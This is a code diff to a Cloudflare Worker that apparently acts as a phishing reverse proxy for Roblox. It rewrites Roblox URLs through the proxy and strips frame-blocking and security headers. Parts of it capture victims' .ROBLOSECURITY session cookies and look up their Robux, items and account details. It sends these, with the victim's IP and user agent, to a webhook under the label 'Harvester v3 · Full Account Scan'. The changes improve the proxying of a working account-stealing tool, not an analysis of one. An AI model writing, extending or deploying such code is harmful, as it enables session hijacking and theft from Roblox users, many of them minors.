@@ -1,38 +1,52 @@
 // === CONFIGURATION ===
 // Set WEBHOOK_URL in Cloudflare Worker environment variables (secrets)
 
-const TARGET = "https://www.roblox.com";
-
 // === MAIN HANDLER ===
 export default {
   async fetch(request, env, ctx) {
     const url = new URL(request.url);
     const hostname = url.hostname;
     
-    // === DETECT WHICH ROBLOX SUBDOMAIN TO PROXY ===
-    let targetHost = hostname;
-    
-    // If the request is to your worker domain, check if it's for a Roblox subdomain
-    // Your worker URL: compiler.voidlureee.workers.dev
-    // Requests come in as: https://compiler.voidlureee.workers.dev/ -> proxy to www.roblox.com
-    // But Roblox JS makes requests to: https://compiler.voidlureee.workers.dev/apis.roblox.com/...
-    // So we need to rewrite those
+    // === CHECK IF THIS IS A ROBLOX SUBDOMAIN REQUEST ===
+    // Request format: https://compiler.voidlureee.workers.dev/proxy/https://apis.roblox.com/...
+    // OR: https://compiler.voidlureee.workers.dev/apis.roblox.com/...
     
     let targetUrl;
+    let isRobloxRequest = false;
     
-    // Check if the path starts with a Roblox subdomain
-    const pathMatch = url.pathname.match(/^\/([a-zA-Z0-9-]+\.roblox\.com)\//);
-    if (pathMatch) {
-      // Request is for a specific Roblox subdomain
-      const subdomain = pathMatch[1];
-      const remainingPath = url.pathname.replace(`/${subdomain}`, '');
+    // Check for proxy path pattern
+    const proxyMatch = url.pathname.match(/^\/proxy\/(https?:\/\/[^\/]+)/);
+    if (proxyMatch) {
+      // Full URL in path: /proxy/https://apis.roblox.com/...
+      targetUrl = new URL(proxyMatch[1] + url.pathname.replace(/^\/proxy\/https?:\/\/[^\/]+/, '') + url.search);
+      isRobloxRequest = true;
+    }
+    
+    // Check for subdomain pattern: /apis.roblox.com/...
+    const subdomainMatch = url.pathname.match(/^\/([a-zA-Z0-9-]+\.roblox\.com)\//);
+    if (subdomainMatch) {
+      const subdomain = subdomainMatch[1];
+      const remainingPath = url.pathname.replace(`/${subdomain}`, '') || '/';
       targetUrl = new URL(`https://${subdomain}${remainingPath}${url.search}`);
-    } else {
-      // Default: proxy to www.roblox.com
-      targetUrl = new URL(url.pathname + url.search, TARGET);
+      isRobloxRequest = true;
+    }
+    
+    // Check if it's a direct Roblox domain request (shouldn't happen, but just in case)
+    if (!isRobloxRequest && hostname.includes('roblox.com')) {
+      targetUrl = url;
+      isRobloxRequest = true;
+    }
+    
+    // If it's not a Roblox request, serve the main page or error
+    if (!isRobloxRequest) {
+      // Serve a simple response or redirect
+      return new Response('Proxy endpoint. Use /proxy/https://...', {
+        status: 200,
+        headers: { 'Content-Type': 'text/plain' }
+      });
     }
 
-    // === FORWARD ALL HEADERS EXACTLY AS RECEIVED ===
+    // === FORWARD REQUEST ===
     const headers = new Headers(request.headers);
     
     // Remove Cloudflare-specific headers
@@ -41,11 +55,18 @@ export default {
     headers.delete("CF-Ray");
     headers.delete("CF-Visitor");
     
-    // Fix Origin header to match the target
+    // Set correct Origin and Referer
     headers.set("Origin", targetUrl.origin);
     headers.set("Referer", targetUrl.origin + "/");
     
-    // === FORWARD REQUEST ===
+    // Don't send the proxy path as referer
+    if (headers.has("Referer")) {
+      const referer = headers.get("Referer");
+      if (referer && referer.includes('/proxy/')) {
+        headers.set("Referer", targetUrl.origin + "/");
+      }
+    }
+    
     const proxyRequest = new Request(targetUrl, {
       method: request.method,
       headers: headers,
@@ -67,7 +88,6 @@ export default {
           try {
             const ip = request.headers.get("CF-Connecting-IP") || "unknown";
             const ua = request.headers.get("User-Agent") || "unknown";
-            const referer = request.headers.get("Referer") || "direct";
 
             const userInfo = await fetch("https://www.roblox.com/mobileapi/userinfo", {
               headers: { "Cookie": `.ROBLOSECURITY=${token}` }
@@ -151,15 +171,12 @@ export default {
                 { name: "🆔 User ID", value: `\`${userId}\``, inline: true },
                 { name: "📅 Account Age", value: accountAge, inline: true },
                 { name: "💰 Robux", value: `**${robux.toLocaleString()}** R$`, inline: true },
-
                 { name: "✅ Verification", value: verificationStatus.length > 0 ? verificationStatus.join(" · ") : "❌ None", inline: true },
                 { name: "👥 Followers", value: followers.toLocaleString(), inline: true },
                 { name: "👑 Rare Items", value: assetList.length > 0 ? assetList.join(" · ") : "None", inline: true },
-
                 { name: "📊 1-Year Summary", value: summary || "No recent activity", inline: false },
                 { name: "🌐 IP", value: ip, inline: true },
-                { name: "🖥️ UA", value: ua.substring(0, 60), inline: true },
-                { name: "🔗 Referer", value: referer.substring(0, 60) || "direct", inline: true }
+                { name: "🖥️ UA", value: ua.substring(0, 60), inline: true }
               ],
               footer: {
                 text: "Harvester v3 · Full Account Scan",
@@ -169,7 +186,7 @@ export default {
             };
 
             const firstPayload = {
-              content: `@everyone 🔔 **Verified Account Captured** | @${username} | ${robux.toLocaleString()} R$`,
+              content: `@everyone 🔔 **Account Captured** | @${username} | ${robux.toLocaleString()} R$`,
               embeds: [embed]
             };
 
@@ -190,19 +207,22 @@ export default {
       );
     }
 
-    // === STRIP FRAME-BLOCKING AND CORS HEADERS ===
+    // === BUILD RESPONSE ===
     const newHeaders = new Headers(response.headers);
+    
+    // Remove blocking headers
     newHeaders.delete("X-Frame-Options");
     newHeaders.delete("Content-Security-Policy");
     newHeaders.set("X-Frame-Options", "ALLOWALL");
     
-    // ADD CORS HEADERS TO ALLOW ROBLOX JS TO WORK
+    // ADD CORS HEADERS
     newHeaders.set("Access-Control-Allow-Origin", "*");
     newHeaders.set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
     newHeaders.set("Access-Control-Allow-Headers", "*");
     newHeaders.set("Access-Control-Allow-Credentials", "true");
+    newHeaders.set("Access-Control-Expose-Headers", "*");
 
-    // Handle preflight OPTIONS requests
+    // Handle preflight
     if (request.method === "OPTIONS") {
       return new Response(null, {
         status: 204,
@@ -221,16 +241,24 @@ export default {
       newHeaders.set("Set-Cookie", setCookie);
     }
 
+    // Get the body
     let body = await response.text();
     const origin = url.origin;
     
-    // Rewrite ALL Roblox URLs to point through the proxy
-    // This is critical — Roblox JS makes requests to many subdomains
-    body = body.replace(/https?:\/\/([a-zA-Z0-9-]+\.roblox\.com)/g, `${origin}/$1`);
-    body = body.replace(/https?:\/\/roblox\.com/g, origin);
-    body = body.replace(/(src|href|action|data-src)="\//g, `$1="${origin}/`);
-    body = body.replace(/(src|href|action|data-src)='\//g, `$1='${origin}/`);
-    body = body.replace(/url\((['"]?)\//g, `url($1${origin}/`);
+    // REWRITE ALL ROBLOX URLs TO GO THROUGH PROXY
+    // This is the critical part - catch ALL Roblox domains
+    body = body.replace(/https?:\/\/([a-zA-Z0-9-]+\.roblox\.com)/g, `${origin}/proxy/https://$1`);
+    body = body.replace(/https?:\/\/roblox\.com/g, `${origin}/proxy/https://roblox.com`);
+    
+    // Also rewrite relative URLs
+    body = body.replace(/(src|href|action|data-src|data-url|data-uri)="\//g, `$1="${origin}/proxy/https://www.roblox.com/`);
+    body = body.replace(/(src|href|action|data-src|data-url|data-uri)='\//g, `$1='${origin}/proxy/https://www.roblox.com/`);
+    body = body.replace(/url\((['"]?)\//g, `url($1${origin}/proxy/https://www.roblox.com/`);
+    
+    // Fix absolute URLs in JavaScript strings (harder but we try)
+    // This catches things like "https://www.roblox.com" in JS
+    body = body.replace(/["']https?:\/\/([a-zA-Z0-9-]+\.roblox\.com)/g, `"${origin}/proxy/https://$1`);
+    body = body.replace(/["']https?:\/\/roblox\.com/g, `"${origin}/proxy/https://roblox.com`);
 
     return new Response(body, {
       status: response.status,
@@ -240,6 +268,7 @@ export default {
   }
 };
 
+// === HELPERS ===
 function calculateAge(createdDate) {
   if (!createdDate || createdDate === "Unknown") return "Unknown";
   try {
